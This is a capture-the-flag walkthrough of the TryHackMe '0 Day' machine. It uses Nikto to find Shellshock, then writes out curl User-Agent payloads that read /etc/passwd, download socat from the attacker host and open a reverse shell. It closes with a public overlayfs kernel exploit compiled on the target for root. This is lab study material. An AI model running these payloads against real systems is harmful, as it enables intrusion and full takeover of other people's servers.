<!doctype html>
<html>
<head>
  <meta http-equiv="content-type" content="text/html; charset=utf-8">
  <title>0day</title>
  <meta name="generator" content="CherryTree">
  <link rel="stylesheet" href="res/styles4.css" type="text/css" />
</head>
<body>
<div class='page'><h1 class='title'>0day</h1><br/><p><strong><h1>THM: 0 Day</h1></strong></p><p></p><p></p><p><strong><h2>Enumeration</h2></strong></p><p></p><p><strong><h3>Rustscan &amp; Nmap</h3></strong></p><p><img src="images/61-1.png" alt="images/61-1.png" /></p><p></p><p><strong><h3>Nikto</h3></strong></p><p><strong>nikto --url http://10.10.55.169 | tee nikto_results</strong></p><p></p><p><img src="images/61-2.png" alt="images/61-2.png" /></p><p></p><p>We find <strong>shellshock</strong> vulnerability.</p><p></p><p><strong><h2>Foothold</h2></strong></p><p></p><p><strong>Method-1 (Apperentice)</strong></p><p></p><p>Search the <strong>shellshock</strong> exploit in searchsploit.</p><p></p><p><img src="images/61-3.png" alt="images/61-3.png" /></p><p></p><p><strong>Note:</strong> The first metasploit version may also work. I have not tested it.</p><p>I will use the 2nd one.</p><p></p><p><strong>searchsploit -m 34900</strong></p><p></p><p>Download the python file &amp; rename it as exploit.py</p><p><strong>Note:</strong> It uses python 2</p><p></p><p>Run as follows:</p><p><strong>Note:</strong> I got the value of pages from Nikto scan. (Else the code searches for a series of default paths, this included, so will work without &quot;pages&quot; argument)</p><p></p><p><strong>python2 exploit.py payload=reverse rhost=10.10.55.169 lhost=10.11.9.100 lport=9999 pages=/cgi-bin/test.cgi</strong></p><p></p><p><img src="images/61-4.png" alt="images/61-4.png" /></p><p></p><p>Thus, we have a fully functional python reverse shell.</p><p> </p><p></p><p><strong>Method-2 (Pro)</strong></p><p></p><p>Nikto indicates that there’s a file called <strong>test.cgi</strong> in the <strong>/cgi-bin/</strong> directory which might be vulnerable to <strong>ShellShock</strong> — a devastating vulnerability which affects <strong>older</strong> <strong>versions</strong> of <strong>Bash</strong>. CGI files are used by the webserver to execute commands in a native scripting language — in this case, that means that our <strong>test.cgi</strong> file will be running Bash commands. With vulnerable versions of bash, injecting a function definition <strong>“(){ :;};”</strong> into the input of such a script would force the script to execute any subsequent commands. Like so:</p><p></p><p><strong>curl -A &quot;() { :;}; echo Content-Type: text/html; echo; /bin/cat /etc/passwd;&quot; http://10.10.55.169/cgi-bin/test.cgi</strong></p><p></p><p><img src="images/61-5.png" alt="images/61-5.png" /></p><p></p><p>Before we start taking advantage of this vulnerability. Let’s dissect the above <strong>curl</strong> command. There are two parts to this command: with <strong>-A</strong> we’re specifying that we want to use a <strong>custom User-Agent</strong>. This is where we inject the payload, simply because the user-agent is a default header which we know will be read by the script. The second part of the command is standard — specifying the target: <strong>http://&lt;MACHINE-IP&gt;/cgi-bin/test.cgi</strong>. With that established, let’s break our payload down a little. There are technically four commands being run here:</p><p></p><p>    <strong><span style="text-decoration:underline;">() { :;};</span></strong></p><p>        This defines an empty bash function. It’s there to activate the vulnerability, as shellshock relies on a function being declared prior to all subsequent commands being executed. </p><p>        </p><p>    <strong><span style="text-decoration:underline;">echo Content-Type: text/html; echo;</span></strong></p><p>        This section of the command is used to prevent the server from crashing when the vulnerability is exploited. A properly formatted HTTP response will contain a Content-Type header, and a blank line before the body of the reponse is displayed. Without these, the server will return a “500 Internal Server” error. Thus we use this section of the payload to simulate the Content-Type header and subsequent blank line.</p><p>    </p><p>    <strong><span style="text-decoration:underline;">/bin/cat /etc/passwd;</span></strong></p><p>        Finally, the meat of the payload. These are the commands we actually want to be executed. In this instance this is merely outputting the contents of /etc/passwd; however, we could add any other commands we wished here.</p><p></p><p>Let’s go ahead and check which user we’re executing commands as:</p><p></p><p><strong>curl -A &quot;() { :;}; echo Content-Type: text/html; echo; /usr/bin/whoami;&quot; http://10.10.55.169/cgi-bin/test.cgi</strong></p><p></p><p><img src="images/61-6.png" alt="images/61-6.png" /></p><p></p><p></p><p>We will use a static binary of socat for this.</p><p>Link: <strong>https://github.com/andrew-d/static-binaries/blob/master/binaries/linux/x86_64/socat?raw=true</strong> </p><p></p><p>Host the socat executible in a python webserver in our kali machine:</p><p></p><p><strong>python -m http.server 80</strong></p><p></p><p>Start a socat listener in our Local machine:</p><p></p><p><strong>socat TCP-L:7777 FILE:`tty`,raw,echo=0	</strong></p><p></p><p>Then, our payload for foothold will be:</p><p></p><p><strong>/usr/bin/wget http://10.11.9.100/socat -O /tmp/socat; /usr/bin/chmod +x /tmp/socat; /tmp/socat TCP:10.11.9.100:7777 EXEC:&quot;bash -li&quot;,pty,stderr,sigint,setsid,sane;</strong></p><p><strong></strong></p><p>Final Curl Command:</p><p></p><p><strong>curl -A &quot;() { :;}; echo Content-Type: text/html; echo; /usr/bin/wget http://10.11.9.100/socat -O /tmp/socat; /bin/chmod +x /tmp/socat; /tmp/socat TCP:10.11.9.100:7777 EXEC:&#39;bash -li&#39;,pty,stderr,sigint,setsid,sane;&quot; http://10.10.55.169/cgi-bin/test.cgi</strong></p><p></p><p><strong>NOTE:</strong> I tried the above command. But it seems to only execute the first command.</p><p>Thus, we need to give each command separately in multiple curl statements as below.</p><p></p><p><strong>curl -A &quot;() { :;}; echo Content-Type: text/html; echo; /usr/bin/wget http://10.11.9.100/socat -O /tmp/socat&quot; http://10.10.55.169/cgi-bin/test.cgi</strong></p><p></p><p><strong>curl -A &quot;() { :;}; echo Content-Type: text/html; echo; /bin/chmod +x /tmp/socat&quot; http://10.10.55.169/cgi-bin/test.cgi</strong></p><p></p><p><strong>curl -A &quot;() { :;}; echo Content-Type: text/html; echo; /tmp/socat TCP:10.11.9.100:7777 EXEC:&#39;bash -li&#39;,pty,stderr,sigint,setsid,sane&quot; http://10.10.55.169/cgi-bin/test.cgi</strong></p><p></p><p>We get a fully functional shell in our listener.</p><p></p><p><img src="images/61-7.png" alt="images/61-7.png" /></p><p></p><p>We get the user flag as follows:</p><p></p><p><img src="images/61-8.png" alt="images/61-8.png" /></p><p></p><p></p><p><strong><h3>Privilege Escalation</h3></strong></p><p></p><p>This is a very old version of Ubuntu, meaning it’s likely vulnerable to a plethora of kernel exploits. Usually a kernel exploit is the last resort — what you use when there are no other methods available. In this instance, however, I happen to know that a kernel exploit is the intended route, so that’s what we’re going with.</p><p></p><p>Let’s start by checking the arch and release notes for this machine:</p><p></p><p><strong>cat /etc/*-release</strong></p><p></p><p><img src="images/61-9.png" alt="images/61-9.png" /></p><p></p><p>There are three important piece of information for our exploit planning:</p><p></p><p>    • The arch is x64</p><p>    • The kernel is version 3.13</p><p>    • The OS version is Ubuntu 14.04.1 LTS</p><p></p><p>Additionally, let’s check to see if the gcc compiler is installed, and if so, which version it is:</p><p></p><p><strong>which gcc</strong></p><p><strong>gcc --version</strong></p><p></p><p><img src="images/61-10.png" alt="images/61-10.png" /></p><p></p><p>Then, in kali lets search in searhsploit.</p><p></p><p><strong>searchsploit Ubuntu 14.04 3.13 Local Privilege Escalation</strong></p><p></p><p><img src="images/61-11.png" alt="images/61-11.png" /></p><p></p><p><strong>searchsploit -m 37292</strong></p><p></p><p>To copy the exploit to the current directory. I renamed it to <strong>ofs.c</strong> &amp; then hosted it in python</p><p></p><p></p><p>In the target machine, we download the c code &amp; compile it.</p><p></p><p><strong>cd /tmp</strong></p><p><strong>wget http://10.11.9.100/ofs.c</strong></p><p><strong>gcc ofs.c -o exploit</strong></p><p></p><p><img src="images/61-12.png" alt="images/61-12.png" /></p><p>we get a compile error. It is due to the PATH variable issue.</p><p></p><p><strong>export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin</strong></p><p></p><p>Then, we compile &amp; run the program again. We got ROOT access !!.</p><p></p><p><img src="images/61-13.png" alt="images/61-13.png" /></p><p></p><p>We get the root flag in the /root directory.</p><p></p></div>
</body>
</html>
